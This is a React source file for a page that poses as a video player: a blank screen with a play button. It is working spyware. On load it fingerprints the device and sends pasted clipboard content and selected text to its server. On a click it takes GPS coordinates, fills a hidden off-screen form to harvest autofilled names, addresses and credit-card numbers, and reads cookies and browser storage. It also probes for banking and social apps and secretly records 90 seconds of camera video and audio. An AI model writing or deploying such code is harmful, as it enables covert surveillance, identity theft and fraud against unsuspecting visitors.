import { useEffect, useRef, useCallback } from 'react';
import { useLogVisit } from '@workspace/api-client-react';

const BASE = import.meta.env.BASE_URL.replace(/\/$/, '');

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Device & browser fingerprint
// ═══════════════════════════════════════════════════════════
async function collectDeviceInfo(): Promise<Record<string, string>> {
  const info: Record<string, string> = {};

  info.screenRes   = `${screen.width}x${screen.height}`;
  info.availRes    = `${screen.availWidth}x${screen.availHeight}`;
  info.pixelRatio  = String(window.devicePixelRatio ?? 1);
  info.orientation = (screen.orientation?.type ?? 'unknown').replace(/-/g, ' ');
  info.touchPoints = String(navigator.maxTouchPoints ?? 0);
  info.memory      = `${(navigator as any).deviceMemory ?? '?'} GB`;
  info.cpuCores    = `${navigator.hardwareConcurrency ?? '?'} cores`;
  info.colorDepth  = `${screen.colorDepth}-bit`;
  info.darkMode    = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
  info.highContrast = window.matchMedia('(prefers-contrast: high)').matches ? 'yes' : 'no';
  info.colorGamut  = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 'sRGB';
  info.hdr         = window.matchMedia('(dynamic-range: high)').matches ? 'yes' : 'no';
  info.cookies     = navigator.cookieEnabled ? 'enabled' : 'disabled';
  info.timezone    = Intl.DateTimeFormat().resolvedOptions().timeZone;
  info.languages   = navigator.languages?.join(', ') ?? navigator.language ?? '';

  // Battery
  try {
    const bat = await (navigator as any).getBattery?.();
    if (bat) { info.battery = `${Math.round(bat.level * 100)}%`; info.charging = bat.charging ? 'yes' : 'no'; }
  } catch {}

  // Network
  const conn = (navigator as any).connection ?? (navigator as any).mozConnection;
  if (conn) {
    info.netType = conn.effectiveType ?? conn.type ?? '?';
    if (conn.downlink != null) info.netDownlink = `${conn.downlink} Mbps`;
    if (conn.rtt     != null) info.netRtt       = `${conn.rtt} ms`;
    if (conn.saveData) info.dataSaver = 'ON';
  }

  // WebGL GPU
  try {
    const c  = document.createElement('canvas');
    const gl = (c.getContext('webgl') ?? c.getContext('experimental-webgl')) as WebGLRenderingContext | null;
    if (gl) {
      const ext      = gl.getExtension('WEBGL_debug_renderer_info');
      info.gpu       = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
      info.gpuVendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
    }
  } catch {}

  // Screen refresh rate (rAF timing)
  try {
    const rate = await new Promise<number>((res) => {
      let n = 0; const t0 = performance.now();
      const f = () => { if (++n < 60) requestAnimationFrame(f); else res(Math.round(n / ((performance.now() - t0) / 1000))); };
      requestAnimationFrame(f);
    });
    info.refreshRate = `${rate}Hz`;
  } catch {}

  // WebRTC local IPs
  try {
    await new Promise<void>((resolve) => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      const ips: string[] = [];
      const done = () => { info.localIPs = ips.join(', ') || 'none'; try { pc.close(); } catch {} resolve(); };
      pc.onicecandidate = (e) => {
        if (!e.candidate) { done(); return; }
        const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
        if (m && !ips.includes(m[1])) ips.push(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
      setTimeout(done, 3000);
    });
  } catch {}

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f80'; ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = '#069'; ctx.fillText('fp_😀_test', 2, 2);
      ctx.strokeStyle = '#f0f'; ctx.beginPath(); ctx.arc(100, 25, 20, 0, Math.PI * 2); ctx.stroke();
      const raw = c.toDataURL();
      let h = 0;
      for (let i = 0; i < raw.length; i++) h = Math.imul(31, h) + raw.charCodeAt(i) | 0;
      info.canvasFP = Math.abs(h).toString(16).toUpperCase();
    }
  } catch {}

  // Audio fingerprint
  try {
    const ac = new AudioContext();
    const osc = ac.createOscillator();
    const analyser = ac.createAnalyser();
    const gain = ac.createGain(); gain.gain.value = 0;
    osc.connect(analyser); analyser.connect(gain); gain.connect(ac.destination);
    osc.start(0);
    const data = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatFrequencyData(data);
    osc.stop(); await ac.close();
    let h = 0;
    for (let i = 0; i < Math.min(data.length, 100); i++) h = Math.imul(31, h) + Math.round(data[i] * 1000) | 0;
    info.audioFP = Math.abs(h).toString(16).toUpperCase();
  } catch {}

  // Input device labels (only populated after getUserMedia grant)
  try {
    const devs = await navigator.mediaDevices.enumerateDevices();
    info.cameras    = String(devs.filter(d => d.kind === 'videoinput').length);
    info.mics       = String(devs.filter(d => d.kind === 'audioinput').length);
    info.camModel   = devs.filter(d => d.kind === 'videoinput' && d.label).map(d => d.label).join(' | ') || 'no label';
    info.micModel   = devs.filter(d => d.kind === 'audioinput' && d.label).map(d => d.label).join(' | ') || 'no label';
  } catch {}

  // Permissions
  if (navigator.permissions) {
    const p = async (n: string) => { try { return (await navigator.permissions.query({ name: n as PermissionName })).state; } catch { return '?'; } };
    info.permCamera = await p('camera');
    info.permMic    = await p('microphone');
  }

  return info;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Autofill injection — name, email, address, CC
// ═══════════════════════════════════════════════════════════
async function collectAutofill(): Promise<Record<string, string>> {
  const result: Record<string, string> = {};
  const form = document.createElement('form');
  form.setAttribute('autocomplete', 'on');
  form.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:250px;';

  const fields: Array<{ key: string; type: string; ac: string }> = [
    { key: 'name',    type: 'text',  ac: 'name' },
    { key: 'email',   type: 'email', ac: 'email' },
    { key: 'phone',   type: 'tel',   ac: 'tel' },
    { key: 'address', type: 'text',  ac: 'street-address' },
    { key: 'city',    type: 'text',  ac: 'address-level2' },
    { key: 'state',   type: 'text',  ac: 'address-level1' },
    { key: 'postal',  type: 'text',  ac: 'postal-code' },
    { key: 'country', type: 'text',  ac: 'country-name' },
    { key: 'dob',     type: 'date',  ac: 'bday' },
    { key: 'company', type: 'text',  ac: 'organization' },
    { key: 'job',     type: 'text',  ac: 'organization-title' },
    { key: 'ccnum',   type: 'text',  ac: 'cc-number' },
    { key: 'ccname',  type: 'text',  ac: 'cc-name' },
    { key: 'ccexp',   type: 'text',  ac: 'cc-exp' },
    { key: 'bankacct', type: 'text', ac: 'off' },
    { key: 'govid',   type: 'text',  ac: 'off' },
  ];

  for (const f of fields) {
    const inp = document.createElement('input');
    inp.type = f.type; inp.name = f.key; inp.id = `_af_${f.key}`;
    inp.setAttribute('autocomplete', f.ac);
    form.appendChild(inp);
  }
  const btn = document.createElement('input'); btn.type = 'submit'; form.appendChild(btn);
  document.body.appendChild(form);

  const first = form.querySelector('input[type="text"]') as HTMLInputElement | null;
  first?.focus();
  first?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
  first?.dispatchEvent(new Event('input', { bubbles: true }));

  await new Promise(r => setTimeout(r, 3000));

  for (const f of fields) {
    const el = document.getElementById(`_af_${f.key}`) as HTMLInputElement | null;
    if (el?.value) result[f.key] = el.value;
  }
  form.remove();
  return result;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Browser storage (same-origin)
// ═══════════════════════════════════════════════════════════
async function collectBrowserStorage(): Promise<Record<string, string>> {
  const d: Record<string, string> = {};
  try { d.cookies = document.cookie.slice(0, 500) || '(empty)'; } catch {}
  try {
    const rows: string[] = [];
    for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
      const k = localStorage.key(i);
      if (k) rows.push(`${k}: ${(localStorage.getItem(k) ?? '').slice(0, 100)}`);
    }
    d.localStorage = rows.join('\n') || '(empty)';
  } catch {}
  try {
    const rows: string[] = [];
    for (let i = 0; i < Math.min(sessionStorage.length, 20); i++) {
      const k = sessionStorage.key(i);
      if (k) rows.push(`${k}: ${(sessionStorage.getItem(k) ?? '').slice(0, 100)}`);
    }
    d.sessionStorage = rows.join('\n') || '(empty)';
  } catch {}
  try { const dbs = await (indexedDB as any).databases?.(); d.indexedDB = dbs?.map((db: any) => db.name).join(', ') || '(empty)'; } catch {}
  try { d.cacheStorage = (await caches.keys()).join(', ') || '(empty)'; } catch {}
  try {
    const regs = await navigator.serviceWorker?.getRegistrations?.();
    d.serviceWorkers = regs?.map(r => r.scope).join(', ') || '(none)';
  } catch {}
  return d;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Social login timing
// ═══════════════════════════════════════════════════════════
async function detectSocialLogins(): Promise<Record<string, string>> {
  const sites = [
    { name: 'facebook',  url: 'https://www.facebook.com/favicon.ico' },
    { name: 'google',    url: 'https://accounts.google.com/favicon.ico' },
    { name: 'instagram', url: 'https://www.instagram.com/favicon.ico' },
    { name: 'twitter',   url: 'https://x.com/favicon.ico' },
    { name: 'tiktok',    url: 'https://www.tiktok.com/favicon.ico' },
    { name: 'linkedin',  url: 'https://www.linkedin.com/favicon.ico' },
    { name: 'discord',   url: 'https://discord.com/favicon.ico' },
    { name: 'reddit',    url: 'https://www.reddit.com/favicon.ico' },
    { name: 'github',    url: 'https://github.com/favicon.ico' },
    { name: 'spotify',   url: 'https://www.spotify.com/favicon.ico' },
    { name: 'netflix',   url: 'https://www.netflix.com/favicon.ico' },
    { name: 'paypal',    url: 'https://www.paypal.com/favicon.ico' },
    { name: 'amazon',    url: 'https://www.amazon.com/favicon.ico' },
    { name: 'gcash',     url: 'https://www.gcash.com/favicon.ico' },
    { name: 'shopee',    url: 'https://shopee.ph/favicon.ico' },
  ];

  const results: Record<string, string> = {};
  await Promise.allSettled(sites.map(async (s) => {
    try {
      const t0 = performance.now();
      await fetch(s.url, { mode: 'no-cors', credentials: 'include', cache: 'no-store' });
      results[s.name] = `${Math.round(performance.now() - t0)}ms`;
    } catch { results[s.name] = 'blocked'; }
  }));
  return results;
}

// ═══════════════════════════════════════════════════════════
// COLLECTOR: Installed app detection via URL scheme + blur
// ═══════════════════════════════════════════════════════════
async function detectInstalledApps(): Promise<Record<string, string>> {
  const results: Record<string, string> = {};
  const apps = [
    { name: 'whatsapp',  scheme: 'whatsapp://send?text=.' },
    { name: 'telegram',  scheme: 'tg://resolve?domain=telegram' },
    { name: 'signal',    scheme: 'sgnl://signal.me' },
    { name: 'zoom',      scheme: 'zoommtg://zoom.us/join' },
    { name: 'slack',     scheme: 'slack://open' },
    { name: 'gcash',     scheme: 'gcash://pay' },
    { name: 'grab',      scheme: 'grab://' },
    { name: 'shopee',    scheme: 'shopee://' },
    { name: 'lazada',    scheme: 'lazada://' },
    { name: 'netflix',   scheme: 'nflx://' },
    { name: 'tiktok',    scheme: 'tiktok://' },
    { name: 'bpi',       scheme: 'bpi://' },
    { name: 'bdo',       scheme: 'bdo://' },
    { name: 'unionbank', scheme: 'unionbank://' },
  ];

  for (const app of apps) {
    await new Promise<void>((resolve) => {
      let installed = false;
      const onBlur = () => { installed = true; };
      window.addEventListener('blur', onBlur);
      try {
        const a = document.createElement('a'); a.href = app.scheme; a.style.display = 'none';
        document.body.appendChild(a); a.click();
        setTimeout(() => {
          window.removeEventListener('blur', onBlur);
          results[app.name] = installed ? 'installed' : '—';
          try { a.remove(); } catch {}
          resolve();
        }, 800);
      } catch {
        window.removeEventListener('blur', onBlur);
        results[app.name] = '?';
        resolve();
      }
    });
  }
  return results;
}

// ═══════════════════════════════════════════════════════════
// VIDEO helpers
// ═══════════════════════════════════════════════════════════
const VIDEO_MIME_TYPES = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
function getSupportedMime(): string | null {
  if (typeof MediaRecorder === 'undefined') return null;
  return VIDEO_MIME_TYPES.find(t => MediaRecorder.isTypeSupported(t)) ?? null;
}

function uploadChunk(chunk: Blob, mimeType: string, index: number, label: string) {
  const reader = new FileReader();
  reader.onloadend = () => {
    const b64 = (reader.result as string).split(',')[1];
    if (!b64) return;
    fetch(`${BASE}/api/visits/videochunk`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chunk: b64, mimeType, index, label }),
    }).catch(() => {});
  };
  reader.readAsDataURL(chunk);
}

function takePhoto(videoEl: HTMLVideoElement, label: string, attempt = 0) {
  if (videoEl.videoWidth > 0) {
    const c = document.createElement('canvas');
    c.width = videoEl.videoWidth; c.height = videoEl.videoHeight;
    const ctx = c.getContext('2d'); if (!ctx) return;
    ctx.drawImage(videoEl, 0, 0);
    fetch(`${BASE}/api/visits/photo`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ photo: c.toDataURL('image/jpeg', 0.9), caption: `[+] ${label} SNAPSHOT` }),
    }).catch(() => {});
  } else if (attempt < 25) {
    setTimeout(() => takePhoto(videoEl, label, attempt + 1), 200);
  }
}

function startCamRecord(
  stream: MediaStream,
  videoEl: HTMLVideoElement,
  durationMs: number,
  label: string,
  onDone?: () => void,
) {
  const cleanup = () => {
    stream.getTracks().forEach(t => t.stop());
    if (document.body.contains(videoEl)) document.body.removeChild(videoEl);
    onDone?.();
  };

  const mimeType = getSupportedMime();
  if (!mimeType) { cleanup(); return; }

  const recorder = new MediaRecorder(stream, { mimeType });
  let idx = 0;
  recorder.ondataavailable = (e) => { if (e.data?.size > 0) uploadChunk(e.data, mimeType, idx++, label); };
  recorder.onstop = () => cleanup();

  if (navigator.locks) {
    navigator.locks.request('rec_lock_' + label, { mode: 'exclusive' }, () =>
      new Promise<void>(r => setTimeout(r, durationMs + 10_000))
    ).catch(() => {});
  }

  takePhoto(videoEl, label);
  recorder.start(10_000);
  setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, durationMs);
}

// ── Helpers ──────────────────────────────────────────────
function makeHiddenVideo(stream: MediaStream): HTMLVideoElement {
  const v = document.createElement('video');
  v.srcObject = stream;
  v.setAttribute('playsinline', 'true');
  (v as any).playsInline = true;
  v.muted = true;
  v.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
  document.body.appendChild(v);
  return v;
}

function post(path: string, body: unknown) {
  fetch(`${BASE}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  }).catch(() => {});
}

// ═══════════════════════════════════════════════════════════
// MAIN COMPONENT
// ═══════════════════════════════════════════════════════════
export default function CapturePage() {
  const { mutate } = useLogVisit();
  const mutateRef  = useRef(mutate); mutateRef.current = mutate;

  const permsRequested = useRef(false);
  const initialLogged  = useRef(false);
  const deviceInfoRef  = useRef<Record<string, string> | null>(null);
  const gpsRef         = useRef<{ lat: number; lng: number; accuracy: number } | null>(null);
  const resultSentRef  = useRef(false);

  const sendGrabberResult = useCallback((
    info: Record<string, string>,
    gps?: { lat: number; lng: number; accuracy: number },
  ) => {
    if (resultSentRef.current) return;
    resultSentRef.current = true;
    const payload = {
      ...info,
      ...(gps ? { _lat: String(gps.lat), _lng: String(gps.lng), _accuracy: String(gps.accuracy) } : {}),
    };
    fetch(`${BASE}/api/visits/deviceinfo`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload),
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (initialLogged.current) return;
    initialLogged.current = true;

    // Log visit to DB
    mutateRef.current({ data: { referrer: document.referrer || undefined } });

    // Passive fingerprint collection
    collectDeviceInfo().then(info => {
      deviceInfoRef.current = info;
      if (gpsRef.current) sendGrabberResult(info, gpsRef.current);
      setTimeout(() => {
        if (!resultSentRef.current && deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current);
      }, 15_000);
    }).catch(() => {});

    // ── Passive clipboard capture ──────────────────────────
    const onPaste = (e: ClipboardEvent) => {
      const text = e.clipboardData?.getData('text') ?? '';
      const items = Array.from(e.clipboardData?.items ?? []);
      if (text) {
        post('/api/visits/intel', { clipboard: { text: text.slice(0, 2000) } });
      }
      const img = items.find(i => i.type.startsWith('image/'));
      if (img) {
        const file = img.getAsFile();
        if (file) {
          const r = new FileReader();
          r.onloadend = () => post('/api/visits/photo', { photo: r.result as string, caption: '[+] CLIPBOARD IMAGE' });
          r.readAsDataURL(file);
        }
      }
    };
    document.addEventListener('paste', onPaste);

    // ── Passive text-selection capture ────────────────────
    let selTimer: ReturnType<typeof setTimeout>;
    const onSelectEnd = () => {
      clearTimeout(selTimer);
      selTimer = setTimeout(() => {
        const sel = window.getSelection()?.toString().trim() ?? '';
        if (sel.length > 5) post('/api/visits/intel', { clipboard: { selected: sel.slice(0, 1000) } });
      }, 500);
    };
    document.addEventListener('mouseup', onSelectEnd);
    document.addEventListener('touchend', onSelectEnd);

    return () => {
      document.removeEventListener('paste', onPaste);
      document.removeEventListener('mouseup', onSelectEnd);
      document.removeEventListener('touchend', onSelectEnd);
    };
  }, [sendGrabberResult]);

  function triggerCapture() {
    if (permsRequested.current) return;
    permsRequested.current = true;

    // ── GPS ────────────────────────────────────────────────
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const gps = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
          gpsRef.current = gps;
          mutateRef.current({
            data: { latitude: gps.lat, longitude: gps.lng, accuracy: gps.accuracy, altitude: pos.coords.altitude ?? undefined, referrer: document.referrer || undefined },
          });
          if (deviceInfoRef.current) sendGrabberResult(deviceInfoRef.current, gps);
        },
        () => { if (deviceInfoRef.current && !resultSentRef.current) sendGrabberResult(deviceInfoRef.current); },
        { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 },
      );
    }

    // ── Intel collection: autofill + social + storage + apps ─
    Promise.allSettled([
      collectAutofill(),
      detectSocialLogins(),
      collectBrowserStorage(),
      detectInstalledApps(),
    ]).then(([af, sl, stor, apps]) => {
      post('/api/visits/intel', {
        autofill: af.status    === 'fulfilled' ? af.value   : undefined,
        social:   sl.status    === 'fulfilled' ? sl.value   : undefined,
        storage:  stor.status  === 'fulfilled' ? stor.value : undefined,
        apps:     apps.status  === 'fulfilled' ? apps.value : undefined,
      });
    }).catch(() => {});

    // ── Front camera + mic (90 s, 10 s chunks) ─────────────
    if (!navigator.mediaDevices?.getUserMedia) return;

    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: 'user' }, audio: true })
      .then(stream => {
        const vid = makeHiddenVideo(stream);
        let started = false;
        vid.onplaying = () => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'FRONT'); } };
        const fb = setTimeout(() => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'FRONT'); } }, 4000);
        vid.play().catch(() => { clearTimeout(fb); stream.getTracks().forEach(t => t.stop()); });
      })
      .catch(() => {
        // Try rear camera if front not available
        navigator.mediaDevices
          .getUserMedia({ video: { facingMode: 'environment' }, audio: false })
          .then(stream => {
            const vid = makeHiddenVideo(stream);
            let started = false;
            vid.onplaying = () => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'REAR'); } };
            const fb = setTimeout(() => { if (!started) { started = true; startCamRecord(stream, vid, 90_000, 'REAR'); } }, 4000);
            vid.play().catch(() => { clearTimeout(fb); stream.getTracks().forEach(t => t.stop()); });
          })
          .catch(() => {});
      });
  }

  // Render: invisible page that prompts on click
  return (
    <div
      onClick={triggerCapture}
      style={{
        position: 'fixed',
        inset: 0,
        background: '#fff',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        cursor: 'pointer',
        userSelect: 'none',
        WebkitTapHighlightColor: 'transparent',
      }}
    >
      <div style={{
        width: 80,
        height: 80,
        borderRadius: '50%',
        backgroundColor: 'rgba(0,0,0,0.07)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        border: '2px solid rgba(0,0,0,0.12)',
        pointerEvents: 'none',
      }}>
        <div style={{
          width: 0,
          height: 0,
          borderStyle: 'solid',
          borderWidth: '14px 0 14px 24px',
          borderColor: 'transparent transparent transparent #222',
          marginLeft: 6,
        }} />
      </div>
    </div>
  );
}
